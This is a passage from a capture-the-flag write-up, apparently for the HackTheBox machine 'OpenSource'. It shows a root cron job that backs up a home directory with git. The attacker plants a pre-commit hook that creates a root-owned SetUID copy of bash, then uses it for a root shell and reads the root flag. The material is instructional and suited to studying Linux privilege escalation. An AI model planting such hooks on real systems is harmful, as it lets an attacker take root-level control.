2022/09/30 13:19:01 CMD: UID=0    PID=18965  | git commit -m Backup for 2022-09-30 
2022/09/30 13:19:01 CMD: UID=0    PID=18966  | git push origin main 
2022/09/30 13:19:01 CMD: UID=0    PID=18967  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/09/30 13:19:01 CMD: UID=0    PID=18968  | /sbin/modprobe -q -- net-pf-10 

```

On even minutes, there’s a bunch of other tasks, but they are all related to cleanup in the containers.

#### git-sync

`/usr/local/bin/git-sync` is a short Bash script responsible for the backup of dev01’s home directory:

```

#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi

```

### Abuse Git Hooks

[Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are scripts that are run on various events in a git repository. I’ve looked at Git hooks before as an unintended path on [Bitlab](/2020/01/11/htb-bitlab.html#unintended-path-from-www-data-to-root).

Any Git repo has a `.git` directory that contains all the version control data. One of the folders in that directory is `hooks`:

```

dev01@opensource:~/.git$ ls
branches  COMMIT_EDITMSG  config  description  FETCH_HEAD  HEAD  hooks  index  info  logs  objects  refs

```

By default, it has a bunch of `.sample` files:

```

dev01@opensource:~/.git/hooks$ ls
applypatch-msg.sample  fsmonitor-watchman.sample  pre-applypatch.sample  prepare-commit-msg.sample  pre-rebase.sample   update.sample
commit-msg.sample      post-update.sample         pre-commit.sample      pre-push.sample            pre-receive.sample

```

Hooks will skip over any file ending in `.sample`. Other than that, they can be whatever kind of script I want them to be.

I’ll write a short script that copies `bash` into `/tmp/0xdf`, makes sure it’s owned by root, and then sets it to SetUID so it runs as root:

```

dev01@opensource:~/.git/hooks$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf'
#!/bin/bash

cp /bin/bash /tmp/0xdf
chown root:root /tmp/0xdf
chmod 4777 /tmp/0xdf
dev01@opensource:~/.git/hooks$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
dev01@opensource:~/.git/hooks$ chmod +x pre-commit

```

I save this as `pre-commit`, so the next time someone tries to commit, it will run. I’ll also need to set that file as executable.

After the next minute, `/tmp/0xdf` is there, and a SetUID binary owned by root:

```

dev01@opensource:~/.git/hooks$ ls -l /tmp/0xdf 
-rwsrwxrwx 1 root root 1113504 Sep 30 13:45 /tmp/0xdf

```

Running with `-p` (to tell Bash not to drop privs) returns a root shell (effective uid is root):

```

dev01@opensource:~/.git/hooks$ /tmp/0xdf -p
0xdf-4.4# id
uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)

```

And I can read `root.txt`:

```

0xdf-4.4# cat /root/root.txt
07bae31e************************

```